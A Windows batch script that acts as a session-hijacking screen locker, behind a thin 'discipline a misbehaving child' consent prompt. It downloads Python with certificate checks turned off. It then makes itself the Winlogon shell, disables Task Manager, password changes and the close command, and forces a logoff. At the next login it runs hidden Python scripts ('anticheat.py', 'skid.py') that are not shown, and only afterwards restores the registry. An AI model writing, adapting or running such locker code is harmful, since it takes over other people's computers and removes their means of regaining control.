@echo off
pushd %~dp0%
noclose
if "%1"=="skid" goto init
echo press any key if you agree that you are ONLY doing this to discipline a misbehaving child...
pause > nul
if exist python goto python
del python-3.8.10-embed-win32.zip /q
aria2c --check-certificate=false -x16 -m16 -s16 https://www.python.org/ftp/python/3.8.10/python-3.8.10-embed-win32.zip
7z x -aoa python-3.8.10-embed-win32.zip -opython
del /q python-3.8.10-embed-win32.zip
:python
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f /d "cmd /c cd /d %cd% && cum.cmd skid"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
shutdown -l
exit
:init
start calculator.exe
start python\pythonw anticheat.py
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /d "%cd%\Untitled2.png"
cls
python\python skid.py
reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
regedit /s "%cd%\fix.reg"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /d "%cd%\Untitled.png"
start userinit
taskkill /f /im pythonw.exe
taskkill /f /im calculator.exe
exit
